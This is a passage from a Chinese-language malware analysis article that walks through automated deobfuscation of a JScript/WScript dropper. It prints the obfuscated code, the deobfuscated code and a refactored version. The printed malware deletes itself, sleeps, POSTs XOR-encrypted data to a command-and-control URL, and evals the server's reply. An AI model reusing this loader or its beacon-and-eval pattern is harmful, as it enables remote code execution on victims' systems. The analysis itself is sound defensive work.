                + "    this[("T", "a", "w", "V", "W") + ["h", "S", "G", "I", "z"][(-666 + 667)] + ("x", "C", "u", "q", "c") + ["r", "Y"][(-326 + 326)] + ["S", "t", "i", "g", "f", "Y"][(-190 + 192)] + ("b", "q", "p") + "t"]["S" + "l" + ("u", "C", "e") + "e" + ["p", "U", "s", "E", "R"][(-375 + 375)]]((464 - (-536)));n"
                + "`}`n"
                + "n"
                + "function womzyjeptfu() `{`n"
                + "    return new Date()[("c", "z", "T", "g") + "e" + ["w", "o", "t", "y", "Y"][(-295 + 297)] + "T" + "i" + ["T", "A", "m", "B", "s"][(-495 + 497)] + ("F", "h", "e")]();n"
                + "`}`n"
                + "sendRequest(gudel6);n"
                + "n"
                + "function sendRequest(gudel6, ores) `{`n"
                + "    if (typeof ores === "u" + "n" + "d" + "e" + ["H", "f", "g", "K", "k"][(286 - 285)] + "i" + ["k", "n", "H"][(839 - 838)] + "e" + ("r", "C", "q", "d")) `{`n"
                + "        ores = false;n"
                + "    `}`n"
                + "    var jwavamhho = '',n"
                + "        pjedafxexrzo5 = '',n"
                + "        umulmpy0;n"
                + "    for (var rajdysnnejav = 0; rajdysnnejav &lt; gudel6["l" + ["K", "B", "e", "g", "w", "l", "w"][(103 - 101)] + "n" + "g" + ("M", "c", "b", "t") + "h"]; rajdysnnejav++) `{`n"
                + "        jwavamhho += rajdysnnejav + '=' + encodeURIComponent('' + gudel6[rajdysnnejav]) + '&amp;';n"
                + "    `}`n"
                + "    jwavamhho = ypychyby(jwavamhho);n"
                + "    try `{`n"
                + "        var aqwi4;n"
                + "        aqwi4 = getAXO(("Z", "M", "u", "M") + "S" + "X" + "M" + "L" + ("h", "v", "2") + "." + ("x", "Z", "S", "X") + "M" + "L" + "H" + ["y", "x", "i", "T", "j", "v"][(465 - 462)] + "T" + "P");n"
                + "        aqwi4[("b", "f", "q", "I", "Z", "o") + ["f", "h", "p", "N"][(-171 + 173)] + "e" + ["n", "r", "s"][(823 - 823)]]("P" + "O" + "S" + ["y", "I", "T", "a", "J", "i", "P"][(-620 + 622)], zuqyljaah, false);n"
                + "        aqwi4["s" + ("x", "k", "l", "e") + "n" + ["d", "l", "H", "P"][(120 - 120)]](jwavamhho);n"
                + "        if (aqwi4[("N", "u", "s") + ["t", "u", "g", "l"][(7 - 7)] + "a" + ("b", "d", "t") + ("b", "c", "D", "Y", "u") + ("Z", "Z", "C", "Y", "s")] == (82 - (-118))) `{`n"
                + "            pjedafxexrzo5 = aqwi4["r" + ("d", "q", "e") + "s" + ("u", "E", "p") + "o" + "n" + "s" + "e" + ["R", "c", "T", "t", "l", "D"][(407 - 405)] + "e" + ("H", "c", "D", "t", "x") + ("n", "L", "N", "L", "y", "t")];n"
                + "            if (pjedafxexrzo5) `{`n"
                + "                umulmpy0 = wvipex(pjedafxexrzo5);n"
                + "                if (ores) `{`n"
                + "                    return umulmpy0;n"
                + "                `}` else `{`n"
                + "                    this["e" + ["A", "e", "g", "v", "F"][(753 - 750)] + ["J", "t", "u", "a", "y", "D", "i"][(-988 + 991)] + ["l", "t", "i"][(744 - 744)]](umulmpy0);n"
                + "                `}`n"
                + "            `}`n"
                + "        `}`n"
                + "    `}` catch (e) `{``}`n"
                + "    return false;n"
                + "`}`n"
                + "n"
                + "function grenejmy(rajdysnnejav) `{`n"
                + "    var weqanndu = ("Z", "d", "0") + "0" + rajdysnnejav["t" + ("y", "J", "V", "M", "o") + "S" + "t" + ["r", "F"][(-216 + 216)] + "i" + ["n", "O"][(-150 + 150)] + ["n", "g", "H"][(388 - 387)]]((-896 + 912));n"
                + "    weqanndu = weqanndu["s" + ["p", "O", "Z", "u", "Z", "k", "W"][(475 - 472)] + ["b", "H", "R", "K", "x"][(399 - 399)] + ["s", "o", "K"][(-686 + 686)] + ["y", "Q", "t", "b", "m", "Y", "H"][(-397 + 399)] + ("O", "E", "k", "r")](weqanndu["l" + "e" + ["F", "n", "V", "c"][(669 - 668)] + ("n", "O", "M", "L", "g") + ("U", "w", "t") + "h"] - 2);n"
                + "    return weqanndu;n"
                + "`}`n"
                + "n"
                + "function wvipex(oqpce3) `{`n"
                + "    var fevfduwa6, dnoyq, rajdysnnejav, pjedafxexrzo5 = '';n"
                + "    dnoyq = parseInt(oqpce3["s" + "u" + "b" + "s" + "t" + ("t", "s", "B", "r")](0, 2), (-474 + 490));n"
                + "    fevfduwa6 = oqpce3["s" + "u" + "b" + ("D", "f", "L", "E", "s") + ["t", "T"][(411 - 411)] + ["r", "v"][(-635 + 635)]](2);n"
                + "    for (rajdysnnejav = 0; rajdysnnejav &lt; fevfduwa6[("x", "c", "t", "E", "l") + ("y", "E", "N", "A", "e") + "n" + "g" + ("O", "F", "t") + "h"]; rajdysnnejav += 2) `{`n"
                + "        pjedafxexrzo5 += String[("F", "K", "f") + ("n", "d", "d", "r") + "o" + ("c", "l", "h", "C", "m") + ("u", "o", "y", "q", "m", "C") + ["h", "c"][(383 - 383)] + ("u", "b", "Y", "a") + ["T", "r", "e", "i"][(962 - 961)] + "C" + ("c", "g", "i", "V", "I", "o") + ["d", "P"][(-1000 + 1000)] + ["X", "e", "y", "U", "Q", "o", "k"][(802 - 801)]](parseInt(fevfduwa6["s" + ["u", "y", "b", "b"][(504 - 504)] + ["N", "S", "q", "b", "n", "t"][(-736 + 739)] + "s" + ("w", "G", "t") + ["j", "S", "r", "v"][(-531 + 533)]](rajdysnnejav, 2), (555 - 539)) ^ dnoyq);n"
                + "    `}`n"
                + "    return pjedafxexrzo5;n"
                + "`}`n"
                + "n"
                + "function ypychyby(oqpce3) `{`n"
                + "    var dnoyq = 158,n"
                + "        rajdysnnejav, pjedafxexrzo5 = '';n"
                + "    for (rajdysnnejav = 0; rajdysnnejav &lt; oqpce3["l" + "e" + ["n", "Z"][(-865 + 865)] + ["g", "p"][(-879 + 879)] + ("Z", "P", "o", "l", "b", "t") + ("F", "G", "P", "I", "h")]; rajdysnnejav++) `{`n"
                + "        pjedafxexrzo5 += grenejmy(oqpce3["c" + "h" + "a" + ["r", "h"][(-164 + 164)] + ("H", "G", "u", "C") + "o" + ["d", "m", "o", "R", "A"][(-524 + 524)] + "e" + ("G", "D", "K", "S", "A") + ("L", "o", "E", "r", "t")](rajdysnnejav) ^ dnoyq);n"
                + "    `}`n"
                + "    return (grenejmy(dnoyq) + pjedafxexrzo5);n"
                + "`}`n"
                + "n"
                + "function getAXO(monebydlba) `{`n"
                + "    return this["W" + "S" + ["c", "n", "q"][(970 - 970)] + ("a", "d", "P", "B", "r") + ["J", "D", "s", "u", "i", "m"][(859 - 855)] + ["k", "p", "c", "x"][(841 - 840)] + ["Q", "m", "t", "u", "m", "l", "q"][(-80 + 82)]]["C" + ("t", "m", "r") + "e" + ["i", "a", "O", "p"][(454 - 453)] + ["d", "P", "w", "t", "q", "n", "e"][(-13 + 16)] + "e" + ("r", "G", "k", "w", "O") + ("W", "L", "b") + ["e", "x", "j", "o", "g"][(-344 + 346)] + "e" + ("I", "Z", "D", "c") + "t"](monebydlba);n"
                + "`}`";
    `}`

`}`
```



## 七、结果对比

为了清楚展现反混淆处理前后的区别，下面给出了反混淆前的一部分代码。

```
try `{`
    var rhepu = getAXO(("w", "b", "S") + ("f", "I", "u", "h", "B", "c") + ("m", "O", "r") + ("Q", "z", "i") + ("m", "q", "X", "p", "r", "p") + ["v", "I", "S", "t", "l"][(949 - 946)] + ("e", "b", "I", "y", "i") + ("e", "g", "S", "T", "Z", "n") + ["o", "g", "u"][(-531 + 532)] + "." + ["F", "E"][(200 - 200)] + "i" + "l" + ("m", "V", "U", "c", "e") + ("b", "n", "o", "S") + "y" + ("o", "q", "A", "c", "J", "s") + ("m", "k", "G", "t") + ("v", "o", "r", "e") + ("k", "w", "m") + ["O", "n"][(899 - 899)] + "b" + "j" + "e" + "c" + ["t", "N"][(290 - 290)]);
    rhepu["D" + "e" + ("W", "y", "F", "j", "j", "l") + ("P", "u", "G", "G", "a", "e") + ["m", "R", "z", "o", "t", "E"][(-393 + 397)] + ["n", "B", "e", "z", "e"][(668 - 666)] + "F" + ("d", "f", "i") + ("u", "i", "F", "a", "m", "l") + ["e", "F", "T", "e"][(-643 + 643)]](this[("J", "w", "x", "J", "W") + ("B", "C", "i", "S") + "c" + ("T", "c", "H", "p", "Q", "r") + "i" + ("m", "u", "p") + ["q", "t", "A", "M", "r", "K", "a"][(-185 + 186)]][
        ["m", "P", "S", "K", "O", "O"][(-757 + 759)] + ("c", "b", "c") + ["r", "g"][(-321 + 321)] + ["D", "v", "H", "i", "d", "a", "A"][(847 - 844)] + ("C", "d", "k", "p") + ["i", "t", "p"][(115 - 114)] + ("R", "H", "z", "d", "r", "F") + "u" + "l" + "l" + "N" + "a" + "m" + ("Q", "m", "W", "W", "e")
    ], true);
`}` catch (e) `{``}`
var zuqyljaah = ("u", "T", "k", "h") + ["t", "G", "H", "M", "X", "n"][(-130 + 130)] + ["t", "E", "r", "T"][(-854 + 854)] + "p" + ":" + "/" + "/" + ["6", "B"][(-689 + 689)] + "0" + ("s", "M", "a", "e") + "a" + ["s", "t", "H", "y", "p", "0", "b"][(395 - 390)] + ["d", "2", "P", "m"][(-362 + 363)] + ["H", "c", "W", "6", "w"][(874 - 871)] + ("X", "s", "0") + "." + "a" + ("Y", "U", "Y", "J", "s", "u") + "t" + ("v", "E", "k", "t", "G", "h") + "." + ["G", "H", "c", "q"][(-698 + 700)] + ("t", "U", "X", "o") + ("u", "p", "d") + "i" + "n" + ["g", "u", "Y"][(-279 + 279)] + ("L", "D", "e", "t", "b") + ("L", "T", "i") + "t" + "." + "c" + "o" + "." + ("u", "R", "u", "i") + "n" + "/" + ["P", "v", "x", "s", "r", "c", "r"][(-350 + 353)] + ("j", "G", "u") + ["j", "R", "b", "q"][(312 - 310)] + ("N", "l", "k", "N", "R", "m") + ("I", "K", "i") + ("W", "o", "j", "e", "t") + "." + "a" + ["E", "z", "k", "f", "s", "U"][(-412 + 416)] + ["m", "j", "v", "p", "g"][(-354 + 357)] + ("o", "s", "w", "x");
var tid = ["5", "O"][(-765 + 765)] + ("R", "m", "l", "f", "z", "0") + ("L", "C", "g", "g", "0");
var r8h = ["S", "g", "a", "L", "r"][(202 - 200)] + "a" + ("c", "H", "L", "m", "d") + "2" + "8" + ("q", "y", "O", "0") + ("y", "Y", "a", "o", "a") + ("x", "B", "p", "p", "9");
var gudel6 = [];
gudel6[("A", "F", "p") + "u" + "s" + ["A", "u", "h", "m"][(584 - 582)]](["k", "a", "h"][(-497 + 498)]);
gudel6[["d", "p", "E", "i"][(37 - 36)] + "u" + ["s", "h", "K"][(935 - 935)] + ("t", "O", "h")](tid);
var kbiag = womzyjeptfu();
var jybspikivsu = kbiag + (224 - (-9776));
while (kbiag &lt; jybspikivsu) `{`
    kbiag = womzyjeptfu();
    this[("T", "a", "w", "V", "W") + ["h", "S", "G", "I", "z"][(-666 + 667)] + ("x", "C", "u", "q", "c") + ["r", "Y"][(-326 + 326)] + ["S", "t", "i", "g", "f", "Y"][(-190 + 192)] + ("b", "q", "p") + "t"]["S" + "l" + ("u", "C", "e") + "e" + ["p", "U", "s", "E", "R"][(-375 + 375)]]((464 - (-536)));
`}`
//More code is omitted due to brevity
```

在使用自动化脚本处理完所有混淆之后，我们可以看到恶意代码一目了然，如下所示。

```
try `{`
    var rhepu = getAXO("Scripting.FileSystemObject");
    rhepu["DeleteFile"](this["WScript"][
        "ScriptFullName"
    ], true);
`}` catch (e) `{``}`
var zuqyljaah = "http://60ea0260.auth.codingbit.co.in/submit.aspx";
var tid = "500";
var r8h = "aad280a9";
var gudel6 = [];
gudel6["push"]("a");
gudel6["push"](tid);
var kbiag = womzyjeptfu();
var jybspikivsu = kbiag + (10000);
while (kbiag &lt; jybspikivsu) `{`
    kbiag = womzyjeptfu();
    this["WScript"]["Sleep"]((1000));
`}`
//More code is omitted due to brevity
```

这里的变量名称仍然含糊不清，但现在我们可以清楚地看到恶意软件的核心功能。



## 八、恶意软件分析

由于现在我们可以读取恶意软件，因此就可以轻松地分析代码。在这篇文章中，我们省略了代码的重构过程，因为上面展示的代码已经不包含其他的混淆。重构的脚本将在下面给出。请注意，完整脚本在本文的文件包之中。代码的第一部分如下：

```
try `{`
    var fileSystemObject = wscriptCreateObject("Scripting.FileSystemObject");
    fileSystemObject["DeleteFile"](this["WScript"]["ScriptFullName"], true);
`}` catch (e) `{``}`
var url = "http://60ea0260.auth.codingbit.co.in/submit.aspx";
var inputArray = [];
var tid = "500";
inputArray["push"]("a");
inputArray["push"](tid);
```

在整个try-catch结构中，原始脚本已经从文件系统中删除。之后，会对几个变量进行初始化。

```
var currentTime = getTime();
var tenSecondsLater = currentTime + 10000;
while (currentTime &lt; tenSecondsLater) `{`
    currentTime = getTime();
    this["WScript"]["Sleep"](1000);
`}`
sendRequest(inputArray);
```

然后，该恶意软件休眠10秒钟，然后调用`sendRequest`函数。

```
function sendRequest(inputArray, shouldReturnResponse) `{`
    if (typeof shouldReturnResponse === "undefined") `{`
        shouldReturnResponse = false;
    `}`
    var postBody = '',
        output = '',
        decryptedPayload;
    for (var i = 0; i &lt; inputArray["length"]; i++) `{`
        postBody += i + '=' + encodeURIComponent('' + inputArray[i]) + '&amp;';
    `}`
    postBody = encrypt(postBody);
    try `{`
        var httpRequest;
        httpRequest = wscriptCreateObject("MSXML2.XMLHTTP");
        httpRequest["open"]("POST", url, false);
        httpRequest["send"](postBody);
        if (httpRequest["status"] == 200) `{`
            output = httpRequest["responseText"];
            if (output) `{`
                decryptedPayload = decrypt(output);
                if (shouldReturnResponse) `{`
                    return decryptedPayload;
                `}` else `{`
                    this["eval"](decryptedPayload);
                `}`
            `}`
        `}`
    `}` catch (e) `{``}`
    return false;
`}`
```

使用加密函数对HTTP参数进行加密，该函数其实是基于XOR的加密功能。取决于shouldReturnResponse布尔值的值，恶意软件将会执行，或者返回解密后的来自服务器的响应。

在测试过程中，命令和控制服务器没有产生响应。根据这个行为，很可能第一条消息会将恶意软件注册在命令和控制服务器上，其中的响应就是Payload，具体取决于命令和控制面板的配置。参与者只能针对受害者的特定IP地址，或者排除某些IP地址范围。请注意，上述这些主要基于推测，因为目前已经无法进行实际的测试。



## 九、总结

通过本文，我们探索了如何识别代码中使用的混淆模式，以及如何使用自动化进行反混淆处理。本文所展示的示例代码相对较小，但这样的方法特别适用于代码量较大的恶意软件分析过程中。在进行事件响应时，每一分钟都至关重要，而探索如何自动化反混淆将显着降低分析样本所花费的时间。
